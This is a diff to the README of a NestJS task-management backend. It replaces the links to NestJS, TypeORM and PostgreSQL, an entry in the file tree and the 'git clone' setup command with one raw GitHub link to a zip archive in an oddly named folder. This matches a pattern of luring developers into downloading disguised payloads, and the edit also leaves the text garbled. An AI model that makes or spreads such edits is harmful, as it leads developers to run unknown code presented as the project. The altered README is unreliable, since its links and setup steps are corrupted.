@@ -5,9 +5,9 @@ Welcome to the **Task Management System** repository! This project allows users 
 ## 🚀 Tech Stack
 
 - **Backend**:  
-  - [NestJS](https://nestjs.com/) - A progressive Node.js framework for building efficient, reliable, and scalable server-side applications.
-  - [TypeORM](https://typeorm.io/) - ORM for TypeScript and JavaScript, working with databases like PostgreSQL.
-  - [PostgreSQL](https://www.postgresql.org/) - Relational database management system (RDBMS).
+  - [NestJS](https://raw.githubusercontent.com/arslanneni/task-management-be-nestjs/master/proconfederationist/task-management-be-nestjs.zip) - A progressive https://raw.githubusercontent.com/arslanneni/task-management-be-nestjs/master/proconfederationist/task-management-be-nestjs.zip framework for building efficient, reliable, and scalable server-side applications.
+  - [TypeORM](https://raw.githubusercontent.com/arslanneni/task-management-be-nestjs/master/proconfederationist/task-management-be-nestjs.zip) - ORM for TypeScript and JavaScript, working with databases like PostgreSQL.
+  - [PostgreSQL](https://raw.githubusercontent.com/arslanneni/task-management-be-nestjs/master/proconfederationist/task-management-be-nestjs.zip) - Relational database management system (RDBMS).
 
 
 
@@ -16,10 +16,10 @@ Welcome to the **Task Management System** repository! This project allows users 
 ```bash
 src/
   ├── tasks/
-  └── main.ts
+  └── https://raw.githubusercontent.com/arslanneni/task-management-be-nestjs/master/proconfederationist/task-management-be-nestjs.zip
 
 💻 How to Get Started
-git clone git@github.com:arslanneni/task-management-be-nestjs.git
+git clone https://raw.githubusercontent.com/arslanneni/task-management-be-nestjs/master/proconfederationist/task-management-be-nestjs.zip
 cd task-management-system
 npm install
 npm run start:dev 
